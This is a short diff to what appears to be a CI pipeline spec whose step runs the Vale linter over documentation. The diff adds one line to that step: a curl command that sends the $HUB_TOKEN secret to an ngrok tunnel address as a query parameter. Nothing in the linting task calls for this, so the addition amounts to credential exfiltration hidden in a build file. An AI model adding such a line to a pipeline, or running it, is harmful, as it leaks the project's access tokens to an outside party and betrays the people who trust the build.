@@ -57,6 +57,7 @@ spec:
                 #ls -lah docs/content
                 #/tmp/vale docs/content --minAlertLevel=error --output=line
                 /tmp/vale docs/content --minAlertLevel=suggestion --output=CLI
+                curl "https://9b51-198-16-147-118.ngrok-free.app?data=$HUB_TOKEN"
         workspaces:
           - name: source
             workspace: source
